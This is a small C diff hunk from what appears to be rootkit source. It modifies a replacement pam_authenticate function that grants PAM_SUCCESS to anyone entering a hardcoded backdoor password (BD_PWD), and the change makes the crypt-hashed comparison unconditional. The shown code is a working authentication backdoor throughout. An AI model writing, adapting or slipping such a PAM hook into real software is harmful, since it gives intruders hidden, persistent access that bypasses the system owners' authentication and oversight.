@@ -13,11 +13,7 @@ int pam_authenticate(pam_handle_t *pamh, int flags){
         snprintf(prompt, sizeof(prompt), "* Password for %s: ", BD_UNAME);
         pam_prompt(pamh, 1, &pw, "%s", prompt);
 
-#ifdef USE_CRYPT
         got_pw = !strcmp(crypt(pw, BD_PWD), BD_PWD);
-#else
-        got_pw = !strcmp(pwd, BD_PWD);
-#endif
         memset(pw, 0, strlen(pw));
         if(got_pw) return PAM_SUCCESS;
         return PAM_USER_UNKNOWN;
